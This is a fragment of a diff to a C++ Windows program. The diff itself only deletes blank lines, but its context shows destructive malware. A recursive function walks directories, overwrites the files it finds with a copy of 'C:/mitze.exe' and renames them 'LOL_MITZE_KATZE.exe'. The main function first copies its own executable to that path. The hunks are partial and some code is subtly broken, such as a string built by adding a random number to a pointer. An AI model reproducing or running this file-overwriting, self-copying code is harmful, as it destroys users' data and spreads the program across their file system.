@@ -5,21 +5,15 @@
 using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
 string Chain = "";
-
 void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
 {
 	if (recursively)
 		FckFiles(directory, fileFilter, false);
-
 	directory += "\\";
-
 	WIN32_FIND_DATA FindFileData;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
-
 	std::string filter = directory + (recursively ? "*" : fileFilter);
-
 	hFind = FindFirstFile(filter.c_str(), &FindFileData);
-
 	if (hFind == INVALID_HANDLE_VALUE)
 	{
 		return;
@@ -34,7 +28,6 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 			CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
 			rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
 		}
-
 		while (FindNextFile(hFind, &FindFileData) != 0)
 		{
 			if (!recursively)
@@ -53,7 +46,6 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				}
 			}
 		}
-
 		DWORD dwError = GetLastError();
 		FindClose(hFind);
 		if (dwError != ERROR_NO_MORE_FILES)
@@ -62,7 +54,6 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 		}
 	}
 }
-
 int main(int argc, char* argv[])
 {
 	CopyFile("./a.exe","C:/mitze.exe",0);
